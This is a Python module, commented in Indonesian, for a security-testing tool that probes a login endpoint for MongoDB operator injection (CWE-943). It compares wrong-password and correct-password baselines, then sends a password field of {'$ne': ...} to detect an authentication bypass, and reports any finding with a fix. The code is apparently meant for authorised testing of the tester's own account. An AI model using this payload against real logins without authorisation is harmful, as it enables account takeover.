"""nosqli_probe — NoSQL injection (Mongo operator) pada login/profil
(CWE-943, high).

Teknik: kirim kredensial milik sendiri + operator $ne pada field
password ({"user":"aku","pass":{"$ne":"x"}}) — bila login BERHASIL tanpa
password benar = bypass terbukti. Differential: kredensial salah asli
harus ditolak (baseline deny), kredensial benar harus diterima (baseline
ok), dan $ne dengan password SALAH harusnya ditolak — bila diterima =
bypass. Guard: hanya akun sendiri; maks 4 request.
"""

from __future__ import annotations

import json

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding


class NosqliProbeTool(Tool):
    name = "nosqli_probe"
    description = ("NoSQL operator injection ($ne) pada login/profil dengan "
                   "tiga-baseline: deny(salah), ok(benar), bypass($ne salah) "
                   "— hanya akun sendiri.")
    risk_tags = {"active"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        url = str(args.get("url") or "")
        user_field = str(args.get("user_field") or "username")
        pass_field = str(args.get("pass_field") or "password")
        username = str(args.get("username") or "")
        password = str(args.get("password") or "")
        success_hint = str(args.get("success_hint") or "")
        if not url or not username or not password:
            return ToolResult(tool=self.name, ok=False,
                              error="args.url + username + password wajib "
                                    "(hanya akun milik sendiri)")

        def post(body: dict):
            ctx.throttle()
            st, _h, bodytxt, _ms = http_engine.http_get(
                url, timeout=ctx.timeout_s, method="POST",
                data=json.dumps(body).encode(),
                headers={"Content-Type": "application/json"})
            ctx.world.request_count += 1
            ok = (success_hint.lower() in bodytxt.lower()) or (
                success_hint == "" and st == 200)
            return ok, st, bodytxt

        # baseline 1: kredensial SALAH -> harus ditolak
        deny_ok, d_st, _b = post({user_field: username, pass_field: "salah-banget-123"})
        # baseline 2: kredensial BENAR -> harus diterima
        ok_ok, o_st, _b = post({user_field: username, pass_field: password})
        shapes = [
            {"variant": "wrong-password", "status": d_st, "accepted": deny_ok},
            {"variant": "correct-password", "status": o_st, "accepted": ok_ok},
        ]
        if deny_ok or not ok_ok:
            return ToolResult(tool=self.name, ok=True, data={
                "url": url, "shapes": shapes,
                "skipped": "baseline tidak konsisten — tidak bisa menyimpulkan "
                           "bypass (cek success_hint)",
            })

        # bypass: password SALAH + operator $ne
        ctx.throttle()
        b_st, _h, b_body, _ms = http_engine.http_get(
            url, timeout=ctx.timeout_s, method="POST",
            data=json.dumps({user_field: username,
                             pass_field: {"$ne": "salah-banget-123"}}).encode(),
            headers={"Content-Type": "application/json"})
        ctx.world.request_count += 1
        bypass = (success_hint.lower() in b_body.lower()) or (
            success_hint == "" and b_st == 200)
        shapes.append({"variant": "nosql-$ne-wrong-password", "status": b_st,
                       "accepted": bypass})

        findings: list[Finding] = []
        if bypass:
            findings.append(Finding(
                tool=self.name,
                title=f"NoSQL injection auth bypass on login ({user_field})",
                severity="high", cwe="CWE-943",
                description=("Login menerima operator Mongo ($ne) pada field "
                             "password: password SALAH diterima selama $ne "
                             "bukan nilai itu — autentikasi bypass terbukti "
                             "pada akun milik sendiri."),
                recommendation=("Sanitasi tipe body (tolak dict pada field "
                                "kredensial); gunakan driver dengan type-"
                                "checking; enforce schema."),
                file_path=None, line_start=None, line_end=None,
                request=f"POST {url} {user_field}=username, "
                        f"{pass_field}={{$ne:'...'}}",
                response=f"baseline deny={deny_ok}/ok={ok_ok}; bypass={bypass} "
                         f"(status {b_st})",
                confidence=0.85, source_skill=self.source_skill,
                status="confirmed", evidence_kind="request-response",
            ))
        return ToolResult(tool=self.name, ok=True, data={
            "url": url, "shapes": shapes, "bypass": bypass,
        }, findings=findings)
